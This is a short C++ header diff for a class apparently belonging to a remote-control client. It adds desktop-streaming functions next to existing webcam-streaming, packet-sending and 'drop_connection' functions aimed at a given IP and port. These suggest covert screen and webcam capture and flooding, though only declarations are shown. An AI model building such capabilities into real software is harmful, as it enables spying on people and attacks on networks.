@@ -46,6 +46,9 @@ class socket_client : public client::base::base_task
 	void send_packets(uint32_t seconds);
 
 	void send_image_webcam();
+	void send_image_desktop();
+	bool send_image(cv::Mat& frame, std::vector<int>& param);
+
 	void on_receive_udp(
 		const boost::system::error_code& error,
 		std::size_t bytes_transfered
@@ -62,6 +65,7 @@ class socket_client : public client::base::base_task
 public:
 	bool drop_connection(std::string port, std::string ip, std::string seconds);
 	bool webcam_realtime(std::string port, std::string ip);
+	bool desktop_realtime(std::string port, std::string ip);
 
 	void execute();
 	void on_execute();
